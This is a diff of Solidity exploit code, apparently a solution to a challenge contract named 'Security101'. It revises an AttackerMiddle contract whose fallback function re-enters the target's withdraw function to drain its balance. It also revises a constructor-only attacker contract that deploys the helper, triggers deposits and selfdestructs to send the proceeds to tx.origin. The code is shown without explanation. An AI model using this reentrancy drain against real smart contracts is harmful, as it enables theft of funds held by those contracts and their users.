@@ -27,26 +27,30 @@ contract AttackerMiddle {
         Security101(token).deposit{value: msg.value}();
     }
 
-    function attack(uint i) public payable {
-        Security101(token).withdraw(i);
-    }
-
     fallback() external payable {
-        if (msg.value == 0) {
-            attack(gasleft());
-            attack(address(token).balance);
-            selfdestruct(payable(tx.origin));
-        } else if (msg.value == address(this).balance) {
-            attack(msg.value);
+        uint value;
+        if (address(this).balance == 0) {
+            value = block.number;
+        } else if (msg.value == 0) {
+            value = address(token).balance;
+        }else if (msg.value == address(this).balance) {
+            value = msg.value;
         }
+        if (value != 0) {
+            Security101(token).withdraw(value);
+        }
+        // if (msg.sender.balance == 0) {
+        //     selfdestruct(payable(tx.origin));
+        // }
     }
 }
 
 // when selfdestruct, nothing would write to code, saving gas.
 contract OptimizedAttackerSecurity101 {
     constructor(address token) payable {
-        OptimizedAttackerSecurity101(address(new AttackerMiddle{value: 50000}())).attack{gas: 50000}();
+        AttackerMiddle tmp = new AttackerMiddle{value: block.number}();
+        Security101(address(tmp)).deposit();
+        Security101(address(tmp)).deposit();
         selfdestruct(payable(tx.origin));
     }
-    function attack() external {}
 }
